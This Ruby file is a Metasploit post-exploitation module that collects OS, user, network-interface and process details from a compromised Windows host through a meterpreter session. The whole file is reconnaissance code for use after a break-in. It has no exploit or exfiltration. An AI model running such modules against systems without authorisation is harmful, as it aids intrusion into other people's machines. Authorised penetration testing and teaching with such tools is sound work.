##
# Information Gathering Post-Exploitation Module
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::Net
  include Msf::Post::Common

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Windows Information Gathering',
        'Description' => 'Gathers system, user, network, and process information from a compromised Windows host',
        'Author'      => ['Farid Mirzazada'],
        'License'     => MSF_LICENSE,
        'Platform'    => ['win'],
        'SessionTypes'=> ['meterpreter']
      )
    )

    register_options(
      [
        OptInt.new('SESSION', [true, 'The session ID'])
      ]
    )
  end

  def run
    print_status("Gathering system information from #{session.session_host}")

    gather_system_info
    gather_user_info
    gather_network_info
    gather_running_processes
  end

  #
  # SYSTEM INFORMATION
  #
  def gather_system_info
    sys = sysinfo
    print_status("OS: #{sys['OS']}")
    print_status("Computer: #{sys['Computer']}")
  end

  #
  # USER INFORMATION
  #
  def gather_user_info
    user = session.sys.config.getuid
    print_status("User: #{user}")
  end

  #
  # NETWORK INFORMATION
  #
  def gather_network_info
    interfaces = session.net.config.interfaces

    interfaces.each do |iface|
      iface.addrs.each do |addr|
        print_status(
          "Interface: #{iface.name}, IP: #{addr.ip}, Netmask: #{addr.netmask}"
        )
      end
    end
  end

  #
  # RUNNING PROCESSES
  #
  def gather_running_processes
    processes = session.sys.process.get_processes

    processes.each do |proc|
      print_status("Process #{proc['pid']} - #{proc['name']}")
    end
  end
end
